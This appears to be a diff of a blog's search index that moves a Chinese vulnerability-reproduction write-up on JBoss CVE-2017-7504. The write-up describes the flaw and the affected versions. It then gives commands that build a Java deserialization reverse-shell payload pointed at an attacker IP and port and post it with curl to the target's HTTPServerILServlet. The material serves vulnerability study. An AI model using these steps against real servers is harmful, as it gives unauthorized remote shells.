@@ -341,33 +341,6 @@
     
     
     <entry>
-      <title>Jboss CVE-2017-7504</title>
-      <link href="/article/45a5e5d3.html"/>
-      <url>/article/45a5e5d3.html</url>
-      
-        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 漏洞复现 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> JBOSS </tag>
-            
-            <tag> CVE-2017-7504 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Jboss JMX Console未授权访问Getshell</title>
       <link href="/article/be1e1f83.html"/>
       <url>/article/be1e1f83.html</url>
@@ -387,6 +360,33 @@
             <tag> JBOSS </tag>
             
             <tag> JBOSS未授权访问Getshell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Jboss CVE-2017-7504</title>
+      <link href="/article/45a5e5d3.html"/>
+      <url>/article/45a5e5d3.html</url>
+      
+        <content type="html"><![CDATA[<p>[toc]</p><h2 id="JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X"><a href="#JBOSSMQ-JMS-CVE-2017-7504-集群反序列化漏洞-4-X" class="headerlink" title="JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X"></a>JBOSSMQ JMS CVE-2017-7504 集群反序列化漏洞 4.X</h2><h3 id="0x01漏洞描述"><a href="#0x01漏洞描述" class="headerlink" title="0x01漏洞描述"></a>0x01漏洞描述</h3><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执⾏任意代码。</p><h3 id="0x02影响版本"><a href="#0x02影响版本" class="headerlink" title="0x02影响版本"></a>0x02影响版本</h3><p>JBoss AS 4.x及之前版本</p><h3 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h3><hr><p>1、首先验证目标jboss是否存在此漏洞,直接访问<br>/jbossmq-httpil/HTTPServerILServlet 路径下。若访问200或下载，则可能存在漏洞。<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208220941482_14194.png"><br>此处我们使用<a href="https://github.com/joaomatosf/JavaDeserH2HC">JavaDeserH2HC</a>工具来利用该漏洞,尝试直接弹回一个shell<br>注意：这个工具在linux系统使用</p><pre class="line-numbers language-none"><code class="language-none">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 反弹的IP:端口curl http:&#x2F;&#x2F;目标IP:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet&#x2F; --data-binary @ReverseShellCommonsCollectionsHashMap.ser<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>端口监听：</strong><br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221156161_24717.png"><br>反弹shell成功<br><img src="https://imges-1255470970.cos.ap-nanjing.myqcloud.com/1607606636_20201208221425595_28775.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JBOSS </tag>
+            
+            <tag> CVE-2017-7504 </tag>
             
         </tags>
       
